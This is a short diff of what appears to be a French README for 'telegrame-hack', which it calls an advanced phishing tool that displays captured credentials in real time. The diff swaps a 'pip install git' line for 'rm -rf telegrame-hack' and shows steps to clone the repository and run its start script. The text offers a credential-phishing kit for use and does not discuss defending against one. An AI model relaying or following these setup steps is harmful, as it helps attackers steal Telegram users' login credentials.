@@ -11,7 +11,7 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
 1. **Mettre à jour les paquets** :
    ```bash
    
-   pip install git
+   rm -rf telegrame-hack
    git clone https://github.com/Samsmis01/telegrame-hack.git
    cd telegrame-hack
    bash start.sh
